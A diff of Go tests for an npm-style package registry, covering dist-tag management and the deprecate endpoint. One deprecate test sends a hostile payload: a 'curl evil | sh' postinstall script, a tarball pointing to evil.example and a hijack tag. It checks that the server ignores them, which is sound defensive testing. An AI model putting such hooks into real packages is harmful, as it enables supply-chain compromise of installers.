@@ -366,15 +366,6 @@ func TestPublish_RecordsThePrincipalAsActor(t *testing.T) {
 	}
 }
 
-func TestPublish_NoAttachmentsIs501UntilDeprecateExists(t *testing.T) {
-	f := newFixture(t, testPublicURL)
-	doc := publishDocument(t, "foo", "1.0.0", packageTarball(t, "foo", "1.0.0"))
-	delete(doc, "_attachments")
-	if status, got := f.put("foo", encodeDocument(t, doc)); status != http.StatusNotImplemented {
-		t.Fatalf("PUT = %d %s, want 501", status, got)
-	}
-}
-
 func TestRoutes_OtherMethodsAre405(t *testing.T) {
 	f := newFixture(t, testPublicURL)
 	cases := []struct {
@@ -921,4 +912,329 @@ func TestPackument_ReportsDeprecatedAndFallsBackLatest(t *testing.T) {
 			t.Fatalf("latest = %q, want 2.0.0-beta.10", got)
 		}
 	})
+}
+
+func (f *npmFixture) distTagsPath(pkgPath, tag string) string {
+	path := "/npm/" + testRepo + "/-/package/" + url.PathEscape(pkgPath) + "/dist-tags"
+	if tag != "" {
+		path += "/" + tag
+	}
+	return path
+}
+
+func (f *npmFixture) distTags(token, pkgPath string) (int, map[string]string) {
+	f.t.Helper()
+	status, got, _ := f.do(token, http.MethodGet, f.distTagsPath(pkgPath, ""), nil)
+	var tags map[string]string
+	if status == http.StatusOK {
+		if err := json.Unmarshal(got, &tags); err != nil {
+			f.t.Fatalf("decoding dist-tags: %v\n%s", err, got)
+		}
+	}
+	return status, tags
+}
+
+func TestDistTags_ListAddRemove(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+
+	if status, tags := f.distTags(readerToken, "foo"); status != http.StatusOK || !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
+		t.Fatalf("GET = %d %v, want latest only", status, tags)
+	}
+	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "beta"), []byte(`"1.0.0"`)); status != http.StatusCreated {
+		t.Fatalf("PUT = %d %s, want 201", status, got)
+	}
+	if _, tags := f.distTags(adminToken, "foo"); tags["beta"] != "1.0.0" {
+		t.Fatalf("tags after PUT = %v", tags)
+	}
+	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "beta"), nil); status != http.StatusCreated {
+		t.Fatalf("DELETE = %d %s, want 201", status, got)
+	}
+	if _, tags := f.distTags(adminToken, "foo"); len(tags) != 1 {
+		t.Fatalf("tags after DELETE = %v", tags)
+	}
+	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "latest"), nil); status != http.StatusBadRequest {
+		t.Fatalf("DELETE latest = %d %s, want 400", status, got)
+	}
+	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "beta"), nil); status != http.StatusNotFound {
+		t.Fatalf("DELETE missing tag = %d %s, want 404", status, got)
+	}
+}
+
+func TestDistTags_ScopedNameAndFallbackLatest(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublishTo(testRepo, "@acme/ui", "@acme/ui", "1.0.0", packageTarball(t, "@acme/ui", "1.0.0"))
+	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("@acme/ui", "beta"), []byte(`"1.0.0"`)); status != http.StatusCreated {
+		t.Fatalf("PUT scoped = %d %s, want 201", status, got)
+	}
+	f.mustPublishTagged("bar", "1.0.0", "next")
+	if err := f.reg.RemoveDistTag(t.Context(), testRepo, "bar", "latest", "x"); err == nil {
+		t.Fatal("registry removed latest")
+	}
+	if _, err := f.data.Pool().Exec(t.Context(), `DELETE FROM dist_tags WHERE tag = 'latest'`); err != nil {
+		t.Fatalf("deleting latest: %v", err)
+	}
+	if _, tags := f.distTags(adminToken, "bar"); tags["latest"] != "1.0.0" {
+		t.Fatalf("GET without a latest row = %v, want the fallback readers see", tags)
+	}
+}
+
+func TestDistTags_MovingLatestChangesTheDefault(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	f.mustPublishTagged("foo", "2.0.0", "next")
+	if got := f.packument("foo").DistTags["latest"]; got != "1.0.0" {
+		t.Fatalf("latest = %q before the move", got)
+	}
+	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "latest"), []byte(`"2.0.0"`)); status != http.StatusCreated {
+		t.Fatalf("PUT = %d %s, want 201", status, got)
+	}
+	if got := f.packument("foo").DistTags["latest"]; got != "2.0.0" {
+		t.Fatalf("latest = %q after the move, want 2.0.0", got)
+	}
+	// The same move again writes nothing.
+	before := f.count(`SELECT count(*) FROM dist_tag_events`)
+	f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "latest"), []byte(`"2.0.0"`))
+	if after := f.count(`SELECT count(*) FROM dist_tag_events`); after != before {
+		t.Fatalf("events %d -> %d for a no-op move", before, after)
+	}
+}
+
+func TestDistTags_ReadOnlyCallerCannotMove(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	if status, got, _ := f.do(readerToken, http.MethodPut, f.distTagsPath("foo", "beta"), []byte(`"1.0.0"`)); status != http.StatusForbidden {
+		t.Fatalf("PUT = %d %s, want 403", status, got)
+	}
+	if status, got, _ := f.do(readerToken, http.MethodDelete, f.distTagsPath("foo", "latest"), nil); status != http.StatusForbidden {
+		t.Fatalf("DELETE = %d %s, want 403", status, got)
+	}
+	if _, tags := f.distTags(adminToken, "foo"); !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
+		t.Fatalf("tags = %v, want unchanged", tags)
+	}
+	if status, _ := f.distTags(outsiderToken, "foo"); status != http.StatusNotFound {
+		t.Fatalf("GET by an outsider = %d, want 404", status)
+	}
+}
+
+func TestDistTags_InvalidInputs(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	cases := []struct {
+		name   string
+		method string
+		pkg    string
+		tag    string
+		body   string
+		want   int
+	}{
+		{name: "a tag that reads as a version", method: http.MethodPut, pkg: "foo", tag: "1.0.0", body: `"1.0.0"`, want: http.StatusBadRequest},
+		{name: "an unknown version", method: http.MethodPut, pkg: "foo", tag: "beta", body: `"9.9.9"`, want: http.StatusNotFound},
+		{name: "a body that is not a string", method: http.MethodPut, pkg: "foo", tag: "beta", body: `{"v":"1.0.0"}`, want: http.StatusBadRequest},
+		{name: "a body that is not JSON", method: http.MethodPut, pkg: "foo", tag: "beta", body: `1.0.0`, want: http.StatusBadRequest},
+		{name: "a body over the bound", method: http.MethodPut, pkg: "foo", tag: "beta", body: `"` + strings.Repeat("1", 4<<10) + `"`, want: http.StatusRequestEntityTooLarge},
+		{name: "an unknown package", method: http.MethodPut, pkg: "nope", tag: "beta", body: `"1.0.0"`, want: http.StatusNotFound},
+		{name: "an invalid package name", method: http.MethodPut, pkg: "Foo", tag: "beta", body: `"1.0.0"`, want: http.StatusNotFound},
+		{name: "an invalid tag on delete", method: http.MethodDelete, pkg: "foo", tag: "1.0.0", want: http.StatusBadRequest},
+		{name: "get of an unknown package", method: http.MethodGet, pkg: "nope", want: http.StatusNotFound},
+		{name: "post", method: http.MethodPost, pkg: "foo", tag: "beta", want: http.StatusMethodNotAllowed},
+		{name: "put without a tag", method: http.MethodPut, pkg: "foo", body: `"1.0.0"`, want: http.StatusMethodNotAllowed},
+		{name: "get with a tag", method: http.MethodGet, pkg: "foo", tag: "beta", want: http.StatusMethodNotAllowed},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			status, got, _ := f.do(adminToken, tc.method, f.distTagsPath(tc.pkg, tc.tag), []byte(tc.body))
+			if status != tc.want {
+				t.Fatalf("%s = %d %s, want %d", tc.method, status, got, tc.want)
+			}
+			wantJSONError(t, got)
+		})
+	}
+	if _, tags := f.distTags(adminToken, "foo"); !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
+		t.Fatalf("tags = %v, want unchanged", tags)
+	}
+}
+
+func TestDistTags_ProxyAndVirtualAreRefused(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.createRepo(registry.CreateRepositoryParams{Name: "up", Type: model.RepoTypeProxy, UpstreamURL: "https://registry.npmjs.org"})
+	for _, tc := range []struct {
+		method string
+		body   string
+		want   int
+	}{
+		{http.MethodGet, "", http.StatusNotImplemented},
+		{http.MethodPut, `"1.0.0"`, http.StatusMethodNotAllowed},
+		{http.MethodDelete, "", http.StatusMethodNotAllowed},
+	} {
+		tag := "beta"
+		path := "/npm/up/-/package/foo/dist-tags"
+		if tc.method != http.MethodGet {
+			path += "/" + tag
+		}
+		if status, got, _ := f.do(adminToken, tc.method, path, []byte(tc.body)); status != tc.want {
+			t.Fatalf("%s = %d %s, want %d", tc.method, status, got, tc.want)
+		}
+	}
+}
+
+// deprecateBody is what npm deprecate sends: the packument, without attachments,
+// with the named versions' deprecated fields set.
+func (f *npmFixture) deprecateBody(name string, deprecated map[string]any) map[string]any {
+	f.t.Helper()
+	versions := map[string]any{}
+	for v, d := range deprecated {
+		entry := map[string]any{"name": name, "version": v}
+		if d != absent {
+			entry["deprecated"] = d
+		}
+		versions[v] = entry
+	}
+	return map[string]any{"_id": name, "name": name, "versions": versions}
+}
+
+// absent marks a listed version that carries no deprecated field.
+var absent = struct{}{}
+
+func (f *npmFixture) deprecate(token string, doc map[string]any) (int, []byte) {
+	f.t.Helper()
+	status, got, _ := f.do(token, http.MethodPut, "/npm/"+testRepo+"/"+doc["name"].(string), encodeDocument(f.t, doc))
+	return status, got
+}
+
+func (f *npmFixture) deprecatedOf(name, version string) string {
+	f.t.Helper()
+	raw, ok := f.packument(name).field(f.t, version, "deprecated")
+	if !ok {
+		return ""
+	}
+	var s string
+	if err := json.Unmarshal(raw, &s); err != nil {
+		f.t.Fatalf("decoding deprecated: %v", err)
+	}
+	return s
+}
+
+func TestDeprecate_OnlyTheDeprecatedFieldIsRead(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	f.mustPublish("foo", "2.0.0")
+	before := f.packument("foo")
+
+	doc := f.deprecateBody("foo", map[string]any{"1.0.0": "use 2"})
+	entry := member(t, doc, "versions", "1.0.0")
+	entry["dist"] = map[string]any{"tarball": "http://evil.example/x.tgz", "integrity": "sha512-AAAA", "shasum": "00"}
+	entry["dependencies"] = map[string]any{"evil": "1.0.0"}
+	entry["scripts"] = map[string]any{"postinstall": "curl evil | sh"}
+	doc["dist-tags"] = map[string]any{"latest": "1.0.0", "hijack": "1.0.0"}
+	if status, got := f.deprecate(adminToken, doc); status != http.StatusCreated {
+		t.Fatalf("deprecate = %d %s, want 201", status, got)
+	}
+
+	after := f.packument("foo")
+	if !cmp.Equal(after.DistTags, before.DistTags) {
+		t.Fatalf("dist-tags %v -> %v", before.DistTags, after.DistTags)
+	}
+	if string(after.Versions["2.0.0"]) != string(before.Versions["2.0.0"]) {
+		t.Fatal("an unlisted version changed")
+	}
+	var was, now map[string]json.RawMessage
+	if err := json.Unmarshal(before.Versions["1.0.0"], &was); err != nil {
+		t.Fatal(err)
+	}
+	if err := json.Unmarshal(after.Versions["1.0.0"], &now); err != nil {
+		t.Fatal(err)
+	}
+	if string(now["deprecated"]) != `"use 2"` {
+		t.Fatalf("deprecated = %s", now["deprecated"])
+	}
+	delete(now, "deprecated")
+	if !cmp.Equal(was, now) {
+		t.Fatalf("something besides deprecated changed:\n%s\n%s", before.Versions["1.0.0"], after.Versions["1.0.0"])
+	}
+}
+
+func TestDeprecate_ClearAndAbsent(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	for _, v := range []string{"1.0.0", "2.0.0", "3.0.0"} {
+		f.mustPublish("foo", v)
+	}
+	if status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "a", "2.0.0": "b", "3.0.0": "c"})); status != http.StatusCreated {
+		t.Fatalf("deprecate = %d %s", status, got)
+	}
+
+	// 1.0.0 is cleared by an empty string, 2.0.0 by a missing field, and 3.0.0
+	// is not listed.
+	if status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "", "2.0.0": absent})); status != http.StatusCreated {
+		t.Fatalf("clear = %d %s", status, got)
+	}
+	for v, want := range map[string]string{"1.0.0": "", "2.0.0": "", "3.0.0": "c"} {
+		if got := f.deprecatedOf("foo", v); got != want {
+			t.Fatalf("deprecated of %s = %q, want %q", v, got, want)
+		}
+	}
+}
+
+func TestDeprecate_UnknownVersionIs404AndWritesNothing(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "old", "9.9.9": "x"}))
+	if status != http.StatusNotFound {
+		t.Fatalf("deprecate = %d %s, want 404", status, got)
+	}
+	if d := f.deprecatedOf("foo", "1.0.0"); d != "" {
+		t.Fatalf("1.0.0 deprecated = %q after a refused call", d)
+	}
+}
+
+func TestDeprecate_Refusals(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	cases := []struct {
+		name string
+		body string
+		want int
+	}{
+		{name: "message over the limit", body: fmt.Sprintf(`{"name":"foo","versions":{"1.0.0":{"deprecated":%q}}}`, strings.Repeat("x", 4<<10+1)), want: http.StatusBadRequest},
+		{name: "no versions", body: `{"name":"foo"}`, want: http.StatusBadRequest},
+		{name: "empty versions", body: `{"name":"foo","versions":{}}`, want: http.StatusBadRequest},
+		{name: "a different name", body: `{"name":"bar","versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
+		{name: "no name", body: `{"versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
+		{name: "deprecated is not a string", body: `{"name":"foo","versions":{"1.0.0":{"deprecated":5}}}`, want: http.StatusBadRequest},
+		{name: "a version that is not an object", body: `{"name":"foo","versions":{"1.0.0":"x"}}`, want: http.StatusBadRequest},
+		{name: "a repeated versions key is read last", body: `{"name":"foo","versions":{"1.0.0":{"deprecated":"x"}},"versions":{}}`, want: http.StatusBadRequest},
+		{name: "a repeated name key is read last", body: `{"name":"foo","name":"bar","versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
+		{name: "an empty attachments key", body: `{"name":"foo","_attachments":{},"versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusCreated},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			status, got, _ := f.do(adminToken, http.MethodPut, "/npm/"+testRepo+"/foo", []byte(tc.body))
+			if status != tc.want {
+				t.Fatalf("PUT = %d %s, want %d", status, got, tc.want)
+			}
+			if status != http.StatusCreated {
+				wantJSONError(t, got)
+			}
+		})
+	}
+}
+
+func TestDeprecate_ReadOnlyCallerGets403(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.mustPublish("foo", "1.0.0")
+	if status, got := f.deprecate(readerToken, f.deprecateBody("foo", map[string]any{"1.0.0": "x"})); status != http.StatusForbidden {
+		t.Fatalf("deprecate = %d %s, want 403", status, got)
+	}
+	if d := f.deprecatedOf("foo", "1.0.0"); d != "" {
+		t.Fatalf("deprecated = %q", d)
+	}
+}
+
+func TestDeprecate_OnAProxyIs405(t *testing.T) {
+	f := newFixture(t, testPublicURL)
+	f.createRepo(registry.CreateRepositoryParams{Name: "up", Type: model.RepoTypeProxy, UpstreamURL: "https://registry.npmjs.org"})
+	body := encodeDocument(t, f.deprecateBody("foo", map[string]any{"1.0.0": "x"}))
+	if status, got, _ := f.do(adminToken, http.MethodPut, "/npm/up/foo", body); status != http.StatusMethodNotAllowed {
+		t.Fatalf("PUT = %d %s, want 405", status, got)
+	}
 }
